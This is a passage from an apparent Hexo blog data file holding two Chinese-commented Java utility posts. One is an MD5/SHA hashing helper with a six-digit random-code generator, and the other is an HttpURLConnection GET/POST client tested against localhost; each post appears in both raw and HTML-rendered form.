//进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)\n        byte[] md5byte = messageDigest.digest();\n\n        StringBuffer md5Str = new StringBuffer();\n        for(int i=0; i<md5byte.length; i++){\n            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变\n            if(Integer.toHexString(0xFF & md5byte[i]).length() == 1){\n                //位运算后为1位十六进制情况,前面补0\n                md5Str.append(\"0\").append(Integer.toHexString(0xFF & md5byte[i]));\n            }else {\n                //位运算后为2位十六进制情况，直接append\n                md5Str.append(Integer.toHexString(0xFF & md5byte[i]));\n            }\n        }\n        return md5Str.toString();\n    }\n\n    public static  void main(String[] args){\n        System.out.println(getMd5(\"adminbonc123\"));\n    }\n}\n\n```\n","slug":"wheels/java/hashutil","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lu00526dcp2z4fha98","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.UnsupportedEncodingException;</span><br><span class=\"line\">import java.security.MessageDigest;</span><br><span class=\"line\">import java.security.NoSuchAlgorithmException;</span><br><span class=\"line\">import java.util.Random;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.</span><br><span class=\"line\"> * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HashUtil &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 生成六位随机数</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public String creatRandom()&#123;</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        String result=&quot;&quot;;</span><br><span class=\"line\">        for (int i=0;i&lt;6;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            result+=random.nextInt(10);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法</span><br><span class=\"line\">    public static  String getMd5(String str, String... type)&#123;</span><br><span class=\"line\">        MessageDigest messageDigest = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;SHA-512&quot;);</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class=\"line\">            messageDigest = (type.length == 0) ? MessageDigest.getInstance(&quot;MD5&quot;) : MessageDigest.getInstance(type[0]);</span><br><span class=\"line\">            //重置摘要</span><br><span class=\"line\">            messageDigest.reset();</span><br><span class=\"line\">            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException</span><br><span class=\"line\">            messageDigest.update(str.getBytes(&quot;UTF-8&quot;));</span><br><span class=\"line\">        &#125;catch (NoSuchAlgorithmException e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;catch (UnsupportedEncodingException e2)&#123;</span><br><span class=\"line\">            e2.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)</span><br><span class=\"line\">        byte[] md5byte = messageDigest.digest();</span><br><span class=\"line\"></span><br><span class=\"line\">        StringBuffer md5Str = new StringBuffer();</span><br><span class=\"line\">        for(int i=0; i&lt;md5byte.length; i++)&#123;</span><br><span class=\"line\">            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变</span><br><span class=\"line\">            if(Integer.toHexString(0xFF &amp; md5byte[i]).length() == 1)&#123;</span><br><span class=\"line\">                //位运算后为1位十六进制情况,前面补0</span><br><span class=\"line\">                md5Str.append(&quot;0&quot;).append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                //位运算后为2位十六进制情况，直接append</span><br><span class=\"line\">                md5Str.append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return md5Str.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static  void main(String[] args)&#123;</span><br><span class=\"line\">        System.out.println(getMd5(&quot;adminbonc123&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.UnsupportedEncodingException;</span><br><span class=\"line\">import java.security.MessageDigest;</span><br><span class=\"line\">import java.security.NoSuchAlgorithmException;</span><br><span class=\"line\">import java.util.Random;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.</span><br><span class=\"line\"> * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HashUtil &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 生成六位随机数</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public String creatRandom()&#123;</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        String result=&quot;&quot;;</span><br><span class=\"line\">        for (int i=0;i&lt;6;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            result+=random.nextInt(10);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法</span><br><span class=\"line\">    public static  String getMd5(String str, String... type)&#123;</span><br><span class=\"line\">        MessageDigest messageDigest = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;SHA-512&quot;);</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class=\"line\">            messageDigest = (type.length == 0) ? MessageDigest.getInstance(&quot;MD5&quot;) : MessageDigest.getInstance(type[0]);</span><br><span class=\"line\">            //重置摘要</span><br><span class=\"line\">            messageDigest.reset();</span><br><span class=\"line\">            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException</span><br><span class=\"line\">            messageDigest.update(str.getBytes(&quot;UTF-8&quot;));</span><br><span class=\"line\">        &#125;catch (NoSuchAlgorithmException e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;catch (UnsupportedEncodingException e2)&#123;</span><br><span class=\"line\">            e2.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)</span><br><span class=\"line\">        byte[] md5byte = messageDigest.digest();</span><br><span class=\"line\"></span><br><span class=\"line\">        StringBuffer md5Str = new StringBuffer();</span><br><span class=\"line\">        for(int i=0; i&lt;md5byte.length; i++)&#123;</span><br><span class=\"line\">            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变</span><br><span class=\"line\">            if(Integer.toHexString(0xFF &amp; md5byte[i]).length() == 1)&#123;</span><br><span class=\"line\">                //位运算后为1位十六进制情况,前面补0</span><br><span class=\"line\">                md5Str.append(&quot;0&quot;).append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                //位运算后为2位十六进制情况，直接append</span><br><span class=\"line\">                md5Str.append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return md5Str.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static  void main(String[] args)&#123;</span><br><span class=\"line\">        System.out.println(getMd5(&quot;adminbonc123&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"httpclient","date":"2019-01-15T21:21:54.000Z","_content":"```\npackage util;\n\nimport org.omg.CORBA.portable.OutputStream;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下\n */\npublic class HttpClientUtil {\n    /**\n     * url为地址，params 为请求参数 如 id=1&name=xx\n     * @param url\n     * @param params\n     * @return\n     */\n    private static  Map get(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try{\n            URL send_url = params.equals(\"\") ? new URL(url) : new URL(url + \"?\" + params);\n            connection = (HttpURLConnection) send_url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            //一些设置\n            connection.setRequestProperty(\"Connection\",\"keep-alive\");\n            connection.setRequestProperty(\"Accept-Charset\",\"utf8, gbk; q=0.6\");\n            //content-type浏览器会自动解析\n            //connection.setRequestProperty(\"Content-Type\",\"application/json\");\n            //connection.setDoOutput(true);\n            connection.setUseCaches(false);\n\n            connection.connect();\n            headers = connection.getHeaderFields();\n\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),\"UTF-8\"));\n            String line = \"\";\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n            res.put(\"headers\",headers);\n            res.put(\"response\", sb);\n        }catch (Exception e){\n            System.out.println(\"http_get 异常！\");\n            e.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n            }catch (Exception e2){\n\n            }\n        }\n        return res;\n    }\n\n    /**\n     * params为postc参数\n     * @param url\n     * @param params\n     */\n    private static  Map post(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        OutputStreamWriter out = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try {\n            URL send_url = new URL(url);\n            connection = (HttpURLConnection)send_url.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            connection.setUseCaches(false);\n            //以后就可以使用conn.getOutputStream().write()\n            connection.setDoOutput(true);\n            //以后就可以使用conn.getInputStream().read();\n            connection.setDoInput(true);\n\n            out = new OutputStreamWriter(connection.getOutputStream(),\"UTF-8\");\n            out.write(params);\n            out.flush();\n\n            headers = connection.getHeaderFields();\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String line;\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n\n            res.put(\"headers\",headers);\n            res.put(\"response\",sb.toString());\n        }catch (Exception e1){\n            e1.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n                if(out != null){\n                    out.close();\n                }\n            }catch (Exception e2){\n                e2.printStackTrace();\n            }\n        }\n        return res;\n    }\n\n    private void xxxx(){\n\n    }\n\n    public static void main(String args[]){\n//        Map<String,Object> res = get(\"http://127.0.0.1:8080/test1\",\"\");\n//        System.out.println(res.get(\"response\"));\n//        System.out.println(res.get(\"headers\"));\n//        Map<String,List<String>> headers  = (Map<String, List<String>>)res.get(\"headers\");\n//        System.out.println(headers.get(\"Content-Type\"));\n\n        String params = \"{\\n\" +\n                \"    \\\"status\\\": 0,\\n\" +\n                \"    \\\"data\\\": \\\"hello world!\\\"\\n\" +\n                \"}\";\n        Map<String,Object> res = post(\"http://127.0.0.1:8080/test2\",params);\n        System.out.println(res.get(\"response\"));\n\n\n    }\n}\n\n```\n","source":"_posts/wheels/java/httpclient.md","raw":"---\ntitle: httpclient\ndate: 2019-01-15 16:21:54\ntags: [wheels,java]\n---\n```\npackage util;\n\nimport org.omg.CORBA.portable.OutputStream;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下\n */\npublic class HttpClientUtil {\n    /**\n     * url为地址，params 为请求参数 如 id=1&name=xx\n     * @param url\n     * @param params\n     * @return\n     */\n    private static  Map get(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try{\n            URL send_url = params.equals(\"\") ? new URL(url) : new URL(url + \"?\" + params);\n            connection = (HttpURLConnection) send_url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            //一些设置\n            connection.setRequestProperty(\"Connection\",\"keep-alive\");\n            connection.setRequestProperty(\"Accept-Charset\",\"utf8, gbk; q=0.6\");\n            //content-type浏览器会自动解析\n            //connection.setRequestProperty(\"Content-Type\",\"application/json\");\n            //connection.setDoOutput(true);\n            connection.setUseCaches(false);\n\n            connection.connect();\n            headers = connection.getHeaderFields();\n\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),\"UTF-8\"));\n            String line = \"\";\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n            res.put(\"headers\",headers);\n            res.put(\"response\", sb);\n        }catch (Exception e){\n            System.out.println(\"http_get 异常！\");\n            e.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n            }catch (Exception e2){\n\n            }\n        }\n        return res;\n    }\n\n    /**\n     * params为postc参数\n     * @param url\n     * @param params\n     */\n    private static  Map post(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        OutputStreamWriter out = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try {\n            URL send_url = new URL(url);\n            connection = (HttpURLConnection)send_url.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            connection.setUseCaches(false);\n            //以后就可以使用conn.getOutputStream().write()\n            connection.setDoOutput(true);\n            //以后就可以使用conn.getInputStream().read();\n            connection.setDoInput(true);\n\n            out = new OutputStreamWriter(connection.getOutputStream(),\"UTF-8\");\n            out.write(params);\n            out.flush();\n\n            headers = connection.getHeaderFields();\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String line;\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n\n            res.put(\"headers\",headers);\n            res.put(\"response\",sb.toString());\n        }catch (Exception e1){\n            e1.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n                if(out != null){\n                    out.close();\n                }\n            }catch (Exception e2){\n                e2.printStackTrace();\n            }\n        }\n        return res;\n    }\n\n    private void xxxx(){\n\n    }\n\n    public static void main(String args[]){\n//        Map<String,Object> res = get(\"http://127.0.0.1:8080/test1\",\"\");\n//        System.out.println(res.get(\"response\"));\n//        System.out.println(res.get(\"headers\"));\n//        Map<String,List<String>> headers  = (Map<String, List<String>>)res.get(\"headers\");\n//        System.out.println(headers.get(\"Content-Type\"));\n\n        String params = \"{\\n\" +\n                \"    \\\"status\\\": 0,\\n\" +\n                \"    \\\"data\\\": \\\"hello world!\\\"\\n\" +\n                \"}\";\n        Map<String,Object> res = post(\"http://127.0.0.1:8080/test2\",params);\n        System.out.println(res.get(\"response\"));\n\n\n    }\n}\n\n```\n","slug":"wheels/java/httpclient","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lu00556dcpkosvbb0s","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.omg.CORBA.portable.OutputStream;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.net.HttpURLConnection;</span><br><span class=\"line\">import java.net.URL;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HttpClientUtil &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * url为地址，params 为请求参数 如 id=1&amp;name=xx</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map get(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            URL send_url = params.equals(&quot;&quot;) ? new URL(url) : new URL(url + &quot;?&quot; + params);</span><br><span class=\"line\">            connection = (HttpURLConnection) send_url.openConnection();</span><br><span class=\"line\">            connection.setRequestMethod(&quot;GET&quot;);</span><br><span class=\"line\">            //一些设置</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;,&quot;keep-alive&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Accept-Charset&quot;,&quot;utf8, gbk; q=0.6&quot;);</span><br><span class=\"line\">            //content-type浏览器会自动解析</span><br><span class=\"line\">            //connection.setRequestProperty(&quot;Content-Type&quot;,&quot;application/json&quot;);</span><br><span class=\"line\">            //connection.setDoOutput(true);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.connect();</span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\"></span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),&quot;UTF-8&quot;));</span><br><span class=\"line\">            String line = &quot;&quot;;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;, sb);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;http_get 异常！&quot;);</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * params为postc参数</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map post(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        OutputStreamWriter out = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            URL send_url = new URL(url);</span><br><span class=\"line\">            connection = (HttpURLConnection)send_url.openConnection();</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.setRequestMethod(&quot;POST&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;, &quot;Keep-Alive&quot;);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\">            //以后就可以使用conn.getOutputStream().write()</span><br><span class=\"line\">            connection.setDoOutput(true);</span><br><span class=\"line\">            //以后就可以使用conn.getInputStream().read();</span><br><span class=\"line\">            connection.setDoInput(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            out = new OutputStreamWriter(connection.getOutputStream(),&quot;UTF-8&quot;);</span><br><span class=\"line\">            out.write(params);</span><br><span class=\"line\">            out.flush();</span><br><span 